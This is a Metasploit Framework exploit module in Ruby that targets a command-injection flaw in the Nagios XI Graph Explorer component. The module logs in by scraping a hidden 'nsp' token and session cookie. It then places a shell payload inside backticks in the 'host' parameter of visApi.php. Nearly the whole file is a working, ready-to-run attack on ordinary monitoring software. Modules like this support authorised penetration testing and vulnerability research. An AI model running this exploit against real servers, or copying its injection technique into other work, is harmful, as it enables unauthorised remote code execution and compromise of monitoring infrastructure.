##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            'Name'           => "Nagios XI Network Monitor Graph Explorer Component Command Injection",
            'Description'    => %q{
                    This module exploits a vulnerability found in Nagios XI Network Monitor's
                component 'Graph Explorer'.  An authenticated user can execute system commands
                by injecting it in several parameters, such as in visApi.php's 'host' parameter,
                which results in remote code execution.
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
                [
                    'Daniel Compton <daniel.compton[at]ngssecure.com>', #Original discovery
                    'sinn3r'
                ],
            'References'     =>
                [
                    [ 'OSVDB', '83552' ],
                    [ 'BID', '54263' ],
                    [ 'URL', 'http://packetstormsecurity.org/files/118497/Nagios-XI-Network-Monitor-2011R1.9-OS-Command-Injection.html' ]
                ],
            'Payload'        =>
                {
                    'BadChars' => "\x00\x0d\x0a",
                    'Compat'      =>
                        {
                            'PayloadType' => 'cmd',
                            'RequiredCmd' => 'generic perl python ruby bash telnet',
                        }
                },
            'Platform'       => ['unix'],
            'Arch'           => ARCH_CMD,
            'Targets'        =>
                [
                    ['Graph Explorer Component prior to 1.3', {}]
                ],
            'Privileged'     => false,
            'DisclosureDate' => "Nov 30 2012",
            'DefaultTarget'  => 0))
 
        register_options(
            [
                # URI isn't registered, because this is set by the installer.
                OptString.new('USERNAME', [true, 'The username to login as', 'nagiosadmin']),
                OptString.new('PASSWORD', [true, 'The password to use'])
            ], self.class)
    end
 
 
    def check
        res = send_request_raw({
            'method' => 'GET',
            'uri'    => '/nagiosxi/includes/components/graphexplorer/visApi.php'
        })
 
        if res and res.code == 404
            print_error("Remote host does not have Graph Explorer installed.")
        elsif res and res.body =~ /Your session has timed out/
            return Exploit::CheckCode::Detected
        end
 
        return Exploit::CheckCode::Safe
    end
 
    def get_login_data
        res = send_request_cgi({'uri'=>'/nagiosxi/login.php'})
        return '' if !res
 
        nsp = res.body.scan(/<input type='hidden' name='nsp' value='(.+)'>/).flatten[0] || ''
        cookie = (res.headers['Set-Cookie'] || '').scan(/nagiosxi=(\w+); /).flatten[0]  || ''
        return nsp, cookie
    end
 
    def is_loggedin(cookie)
        res = send_request_cgi({
            'method' => 'GET',
            'uri'    => '/nagiosxi/index.php',
            'cookie' => "nagiosxi=#{cookie}"
        })
 
        if res and res.body =~ /Logged in as: <a href=".+">#{datastore['USERNAME']}<\/a>/
            return true
        else
            return false
        end
    end
 
    def login(nsp, cookie)
        res = send_request_cgi({
            'method'    => 'POST',
            'uri'       => '/nagiosxi/login.php',
            'cookie'    => "nagiosxi=#{cookie}",
            'vars_post' => {
                'nsp'         => nsp,
                'page'        => 'auth',
                'debug'       => '',
                'pageopt'     => 'login',
                'username'    => datastore['USERNAME'],
                'password'    => datastore['PASSWORD'],
                'loginButton' => 'Login'
            },
            'headers'   => {
                'Origin'  => "http://#{rhost}",
                'Referer' => "http://#{rhost}/nagiosxi/login.php"
            }
        })
 
        return is_loggedin(cookie)
    end
 
    def exploit
        nsp, cookie = get_login_data
        if nsp.empty?
            print_error("Unable to retrieve hidden value 'nsp'")
            return false
        end
 
        if login(nsp, cookie)
            print_status("Logged in as '#{datastore['USERNAME']}:#{datastore['PASSWORD']}'")
        else
            print_error("Failed to login as '#{datastore['USERNAME']}:#{datastore['PASSWORD']}'")
            return
        end
 
        print_status("Sending Command injection")
        send_request_cgi({
            'method'   => 'GET',
            'uri'      => '/nagiosxi/includes/components/graphexplorer/visApi.php',
            'cookie'   => "nagiosxi=#{cookie}",
            'vars_get' => {
                'type' => 'stack',
                'host' => "localhost`#{payload.encoded}`",
                'service' => 'Swap_Usage',
                'div'     => 'visContainer1566841654',
                'opt'     => 'days'
            }
        })
    end
 
 
